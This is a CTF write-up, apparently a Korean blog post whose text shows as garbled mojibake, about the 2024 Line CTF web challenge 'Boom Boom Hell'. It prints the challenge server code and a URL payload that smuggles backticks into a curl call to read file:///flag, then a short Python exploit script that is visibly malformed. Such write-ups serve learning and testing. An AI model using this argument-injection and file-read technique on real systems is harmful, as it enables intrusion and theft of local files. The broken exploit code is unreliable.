---
title: Boom Boom Hell - Unintened Solve
date: 2024-04-19
author: glasses96
categories: [CTF]
tags: [2024 Line CTF, WEB, Boom Boom Hell]
pin: true
math: true
mermaid: true
---

> **2024 Line CTFì—ì„œ ì›¹ ë¬¸ì œì¸ Boom Boom Hellì„ ì–¸ì¸í…í•˜ì—¬ í’€ì´ë¥¼ ì ì–´ë³´ê³ ì í•©ë‹ˆë‹¤.** 
{: .prompt-info }

<span style="color:#9999FF"></span>

## Boom Boom Hell
ì¤‘ìš” ì½”ë“œì˜ í•´ì„ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.  

1. `/chall` ì—”ë“œí¬ì¸íŠ¸ì— `url` íŒŒë¼ë¯¸í„°ë¥¼ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.  
2. `ifë¬¸ 2ê°œ`ë¥¼ í†µê³¼í•´ì•¼ í•©ë‹ˆë‹¤.  
- urlì˜ íŒŒë¼ë¯¸í„°ì˜ ê¸¸ì´ê°€ escapeHTML(url)ëœ ê¸¸ì´ë³´ë‹¤ ì‘ê±°ë‚˜ ê°™ì•„ì•¼ í•¨  
- URL(url) ê°ì²´ëœ originì´ `https://www.lycorp.co.jp` ì´ì—¬ì•¼í•¨

3. URL ê°ì²´ë¥¼ ë§Œë“¤ì–´ `curl (url)`ë¥¼ ë³´ë‚´ í•´ë‹¹ ì‘ë‹µì„ ì¶œë ¥í•©ë‹ˆë‹¤.

```javascript
import {$, escapeHTML} from "bun";
import qs from "qs";

const port = process.env.PORT || 3000;
const logFile = process.env.LOGFILE || ".log";

const server = Bun.serve({
    host: "0.0.0.0",
    port: port,
    async fetch(req) {
        const url = new URL(req.url);
        if (url.pathname === "/chall") {
            const params = qs.parse(url.search, {ignoreQueryPrefix: true});
            if (params.url.length < escapeHTML(params.url).length) {    // dislike suspicious chars
                return new Response("sorry, but the given URL is too complex for me");
            }

            const lyURL = new URL(params.url, "https://www.lycorp.co.jp");
            if (lyURL.origin !== "https://www.lycorp.co.jp") {
                return new Response("don't you know us?");
            }

            const rawFetched = await $`curl -sL ${lyURL}`.text();
            const counts = {
                "L": [...rawFetched.matchAll(/LINE/g)].length,
                "Y": [...rawFetched.matchAll(/Yahoo!/g)].length,
            }
            await $`echo $(date '+%Y-%m-%dT%H:%M:%S%z') - ${params.url} ::: ${JSON.stringify(counts)} >> ${logFile}`;

            const highlighted = escapeHTML(rawFetched)
                .replace(/LINE/g, "<mark style='color: #06C755'>$&</mark>")
                .replace(/Yahoo!/g, "<mark style='color: #FF0033'>$&</mark>");
            const html = `
                <h1>Your score is... ğŸ<${counts.L + counts.Y}</h1>
                <details open>
                    <summary>Result</summary>
                    <blockquote>${highlighted}</blockquote>            
                </details>
            `;
            return new Response(html, {headers: {"Content-Type": "text/html; charset=utf-8"}});
        } else {
            return new Response("ğŸ¶ğŸ˜ºâ‰¡â‰¡â‰¡ğŸ˜ºğŸ¶ Happy Happy Happy~")
        }
    }
});
console.log(`ğŸ˜º on http://localhost:${server.port}`);
```

![result](/assets/post/58/1.png)

### How to Exploit?
ì œê°€ ì œì¼ ë¨¼ì € ìƒê°í•œ ë°©ë²•ì€ curlì„ ì´ìš©í•˜ëŠ” ê²ƒ ì´ì˜€ìŠµë‹ˆë‹¤.
curlì˜ ì‘ë‹µ ë‚´ìš©ì„ ë³´ì—¬ì£¼ê¸°ì— URLì— file schemeì„ ë„£ì–´ FLAGë¥¼ ì°¾ëŠ” ë°©í–¥ì´ì˜€ìŠµë‹ˆë‹¤.  

```javascript
const rawFetched = await $`curl -sL ${lyURL}`.text();
```

1. curlì„ ë‘ë²ˆ ìš”ì²­ í•˜ê²Œ í•œë‹¤  
- <span style="color:#9999FF">curl {a} {b}</span> ì´ëŸ°ì‹ìœ¼ë¡œ ìš”ì²­í•˜ê²Œë˜ë©´ ë‘ê°œë¥¼ ë³´ë‚´ê²Œ ë©ë‹ˆë‹¤.  
2. origin ìš°íšŒ  
- <span style="color:#9999FF">https://www.lycorp.co.jp?\` \`file:///flag`</span>
- ìœ„ì™€ê°™ì´ ì „ë‹¬í•˜ê²Œ ë˜ë©´ originì€ https://www.lycorp.co.jpê°€ ë©ë‹ˆë‹¤.  

![origin](/assets/post/58/2.png)

### But....?
FLAGê°€ ì˜ ë‚˜ì˜¤ëŠ” ê²ƒì„ í™•ì¸í–ˆìŠµë‹ˆë‹¤.  
![FLAG](/assets/post/58/3.png)


`ë‹¤ë§Œ FLAGê°€ ë‚˜ì™”ì§€ë§Œ ë””ë²„ê¹…ì„ í•´ë³´ë‹ˆ ìƒê°ê³¼ëŠ” ë‹¤ë¥´ê²Œ ë’¤ì— ìš”ì²­ë§Œ ì „ë‹¬` í•˜ë„¤ìš”..?

```javascript
const lyURL = new URL(params.url, "https://www.lycorp.co.jp");
console.log(lyURL);

const rawFetched = await $`curl -sL ${lyURL}`.text();
console.log(rawFetched);
```

![debugging](/assets/post/58/4.png)


## Exploit Code

Exploit Code ì…ë‹ˆë‹¤.  

```py
import requests
http://34.146.180.210:3000/chall?url=https://www.lycorp.co.jp?``file:///flag"
info = lambda x : print(f"[+] {x}")


res = requests.get(URL)
info(f"flag = {res.text}")
```


## í›„ê¸°
ì¸í…í’€ì´ëŠ” raw ì†ì„±ì„ ì£¼ì–´ unescapeë¥¼ í†µí•œ command injection ë¬¸ì œì˜€ìŠµë‹ˆë‹¤.  
docsë¥¼ ë´¤ëŠ”ë° ë„ˆë¬´ ëŒ€ì¶©ë´¤ë‚˜ ë´…ë‹ˆë‹¤... ë³´ê³ ë„ ë„˜ì–´ê°”ë„¤ìš”...  

ë¬¸ì œë¥¼ í’€ì–´ë³´ë‹ˆ ì¢€ ë” ì†ŒìŠ¤ì½”ë“œë¥¼ ì˜ ë¶„ì„í•˜ê³  + ë…ìŠ¤ë„ ê¼¼ê¼¼íˆ ì½ì–´ ë§ì€ ë¬¸ì œë“¤ì„ ì˜ í’€ê³  ì‹¶ë„¤ìš”  
ê·¸ë˜ë„ í•­ìƒ ì–¸ì¸í…ì€ ì§œë¦¿í•¨!